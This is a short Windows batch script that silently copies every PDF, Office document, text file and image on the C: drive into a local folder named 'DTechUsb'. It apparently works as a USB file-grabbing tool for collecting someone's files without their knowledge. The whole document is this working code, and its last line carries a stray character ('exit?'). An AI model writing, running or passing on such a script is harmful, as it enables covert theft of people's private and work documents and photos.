@echo off
IF NOT EXIST ".\DTechUsb" MD ".\DTechUsb"
cd .\DTechUsb
for /R C:\ %%x in (*.pdf *.docx *.xlsx *.pptx *.txt *.jpg *.jpeg *.png) do copy "%%x" ".\"
exit?